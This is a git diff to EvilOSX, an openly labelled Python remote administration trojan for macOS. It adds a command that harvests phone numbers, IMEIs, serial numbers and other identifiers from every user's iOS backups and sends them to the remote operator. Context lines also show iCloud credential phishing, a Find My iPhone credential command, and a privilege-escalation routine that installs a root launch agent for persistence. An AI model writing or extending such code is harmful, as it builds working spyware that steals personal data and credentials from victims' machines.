@@ -1,6 +1,5 @@
 #!/usr/bin/env python
-# A pure python, post-exploitation, remote administration tool (RAT) for macOS / OS X.
-
+# EvilOSX: A pure python, post-exploitation, RAT (Remote Administration Tool) for macOS / OSX.
 import socket
 import ssl
 import os
@@ -12,11 +11,31 @@ import base64
 import json
 import urllib2
 import struct
+from glob import glob
 
 MESSAGE_INFO = "\033[94m" + "[I] " + "\033[0m"
 MESSAGE_ATTENTION = "\033[91m" + "[!] " + "\033[0m"
 
 development = True
+
+
+def get_itunes_backups():
+    response = ""
+    backups = glob("/Users/*/Library/Application Support/MobileSync/Backup/*/Info.plist")
+
+    if len(backups) > 0:
+        for count, item in enumerate(backups):
+            response += MESSAGE_INFO + "Device #{0}:".format(str(count + 1)) + "\n"
+
+            keys = ["Product Name", "Product Version", "Last Backup Date", "Device Name", "Phone Number",
+                    "Serial Number", "IMEI", "Target Identifier", "iTunes Version"]
+
+            for key in keys:
+                value = execute_command("/usr/libexec/PlistBuddy -c 'Print :\"{0}\"' '{1}'".format(key, item))
+                response += "{0}: {1}\n".format(key, value)
+    else:
+        response += MESSAGE_ATTENTION + "No backups found."
+    return response
 
 
 def icloud_phish(server_socket, email):
@@ -105,11 +124,11 @@ def get_root(server_socket):
                 execute_command(command)
 
                 execute_command("sudo launchctl load -w {0}".format(get_launch_agent_file(True)))
-                kill_client()
+                kill_client()  # Kill the old non-root client
             else:
                 send_response(server_socket, MESSAGE_ATTENTION + "Unknown error while running exploit.")
         else:
-            send_response(server_socket, MESSAGE_ATTENTION + "LPE not implemented for this version of OS X ({0}).\n".format(system_version))
+            send_response(server_socket, MESSAGE_ATTENTION + "LPE not implemented for this version of macOS / OSX ({0}).\n".format(system_version))
 
 
 def kill_client(root=False):
@@ -410,6 +429,8 @@ def start_server():
                 output = icloud_phish(server_socket, email)
 
                 send_response(server_socket, output)
+            elif command == "itunes_backups":
+                send_response(server_socket, get_itunes_backups())
             elif command.startswith("find_my_iphone"):
                 email = command.split(" ")[1]
                 password = command.split(" ")[2]
